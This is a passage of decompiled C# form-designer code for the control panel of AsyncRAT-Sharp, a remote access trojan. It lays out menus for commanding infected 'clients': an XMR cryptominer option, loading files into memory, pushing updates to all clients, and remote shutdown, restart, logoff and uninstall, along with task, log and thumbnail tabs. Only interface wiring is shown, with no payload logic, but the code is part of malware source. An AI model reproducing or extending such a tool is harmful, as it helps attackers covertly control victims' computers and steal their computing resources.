      this.sENDFILETOMEMORYToolStripMenuItem1.Click += new EventHandler(this.SENDFILETOMEMORYToolStripMenuItem1_Click);
      this.minerToolStripMenuItem1.Name = "minerToolStripMenuItem1";
      this.minerToolStripMenuItem1.Size = new Size(249, 32);
      this.minerToolStripMenuItem1.Text = "XMR MINER";
      this.minerToolStripMenuItem1.Visible = false;
      this.minerToolStripMenuItem1.Click += new EventHandler(this.MinerToolStripMenuItem1_Click);
      this.uPDATEToolStripMenuItem1.Name = "uPDATEToolStripMenuItem1";
      this.uPDATEToolStripMenuItem1.Size = new Size(249, 32);
      this.uPDATEToolStripMenuItem1.Text = "UPDATE ALL CLIENTS";
      this.uPDATEToolStripMenuItem1.Click += new EventHandler(this.UPDATEToolStripMenuItem1_Click);
      this.toolStripSeparator4.Name = "toolStripSeparator4";
      this.toolStripSeparator4.Size = new Size(246, 6);
      this.dELETETASKToolStripMenuItem.Name = "dELETETASKToolStripMenuItem";
      this.dELETETASKToolStripMenuItem.Size = new Size(249, 32);
      this.dELETETASKToolStripMenuItem.Text = "DELETE TASK";
      this.dELETETASKToolStripMenuItem.Click += new EventHandler(this.DELETETASKToolStripMenuItem_Click);
      this.performanceCounter1.CategoryName = "Processor";
      this.performanceCounter1.CounterName = "% Processor Time";
      this.performanceCounter1.InstanceName = "_Total";
      this.performanceCounter2.CategoryName = "Memory";
      this.performanceCounter2.CounterName = "% Committed Bytes In Use";
      this.notifyIcon1.Icon = (Icon) componentResourceManager.GetObject("notifyIcon1.Icon");
      this.notifyIcon1.Text = "AsyncRAT";
      this.notifyIcon1.Visible = true;
      this.TimerTask.Enabled = true;
      this.TimerTask.Interval = 5000;
      this.TimerTask.Tick += new EventHandler(this.TimerTask_Tick);
      this.shutdownToolStripMenuItem1.Name = "shutdownToolStripMenuItem1";
      this.shutdownToolStripMenuItem1.Size = new Size(270, 34);
      this.shutdownToolStripMenuItem1.Text = "Shutdown";
      this.shutdownToolStripMenuItem1.Click += new EventHandler(this.ShutdownToolStripMenuItem1_Click);
      this.restartToolStripMenuItem3.Name = "restartToolStripMenuItem3";
      this.restartToolStripMenuItem3.Size = new Size(270, 34);
      this.restartToolStripMenuItem3.Text = "Restart";
      this.restartToolStripMenuItem3.Click += new EventHandler(this.RestartToolStripMenuItem3_Click);
      this.logoffToolStripMenuItem1.Name = "logoffToolStripMenuItem1";
      this.logoffToolStripMenuItem1.Size = new Size(270, 34);
      this.logoffToolStripMenuItem1.Text = "Logoff";
      this.logoffToolStripMenuItem1.Click += new EventHandler(this.LogoffToolStripMenuItem1_Click);
      this.closeToolStripMenuItem1.Name = "closeToolStripMenuItem1";
      this.closeToolStripMenuItem1.Size = new Size(270, 34);
      this.closeToolStripMenuItem1.Text = "Close";
      this.closeToolStripMenuItem1.Click += new EventHandler(this.CloseToolStripMenuItem1_Click);
      this.restartToolStripMenuItem2.Name = "restartToolStripMenuItem2";
      this.restartToolStripMenuItem2.Size = new Size(270, 34);
      this.restartToolStripMenuItem2.Text = "Restart";
      this.restartToolStripMenuItem2.Click += new EventHandler(this.RestartToolStripMenuItem2_Click);
      this.updateToolStripMenuItem2.Name = "updateToolStripMenuItem2";
      this.updateToolStripMenuItem2.Size = new Size(270, 34);
      this.updateToolStripMenuItem2.Text = "Update";
      this.updateToolStripMenuItem2.Click += new EventHandler(this.UpdateToolStripMenuItem2_Click);
      this.uninstallToolStripMenuItem.Name = "uninstallToolStripMenuItem";
      this.uninstallToolStripMenuItem.Size = new Size(270, 34);
      this.uninstallToolStripMenuItem.Text = "Uninstall";
      this.uninstallToolStripMenuItem.Click += new EventHandler(this.UninstallToolStripMenuItem_Click);
      this.toolStripSeparator3.Name = "toolStripSeparator3";
      this.toolStripSeparator3.Size = new Size(267, 6);
      this.showFolderToolStripMenuItem.Name = "showFolderToolStripMenuItem";
      this.showFolderToolStripMenuItem.Size = new Size(270, 34);
      this.showFolderToolStripMenuItem.Text = "Show Folder";
      this.showFolderToolStripMenuItem.Click += new EventHandler(this.ShowFolderToolStripMenuItem_Click);
      this.clientToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[6]
      {
        (ToolStripItem) this.closeToolStripMenuItem1,
        (ToolStripItem) this.restartToolStripMenuItem2,
        (ToolStripItem) this.updateToolStripMenuItem2,
        (ToolStripItem) this.uninstallToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator3,
        (ToolStripItem) this.showFolderToolStripMenuItem
      });
      this.clientToolStripMenuItem.Image = (Image) Resources.client;
      this.clientToolStripMenuItem.Name = "clientToolStripMenuItem";
      this.clientToolStripMenuItem.Size = new Size(270, 34);
      this.clientToolStripMenuItem.Text = "Client";
      this.AutoScaleDimensions = new SizeF(9f, 20f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(1301, 511);
      this.Controls.Add((Control) this.tabControl1);
      this.Controls.Add((Control) this.statusStrip1);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (Form1);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "AsyncRAT-Sharp";
      this.Activated += new EventHandler(this.Form1_Activated);
      this.Deactivate += new EventHandler(this.Form1_Deactivate);
      this.FormClosed += new FormClosedEventHandler(this.Form1_FormClosed);
      this.Load += new EventHandler(this.Form1_Load);
      this.contextMenuClient.ResumeLayout(false);
      this.statusStrip1.ResumeLayout(false);
      this.statusStrip1.PerformLayout();
      this.tabControl1.ResumeLayout(false);
      this.tabPage1.ResumeLayout(false);
      this.tabPage2.ResumeLayout(false);
      this.contextMenuLogs.ResumeLayout(false);
      this.tabPage3.ResumeLayout(false);
      this.contextMenuThumbnail.ResumeLayout(false);
      this.tabPage4.ResumeLayout(false);
      this.contextMenuTasks.ResumeLayout(false);
      this.performanceCounter1.EndInit();
      this.performanceCounter2.EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
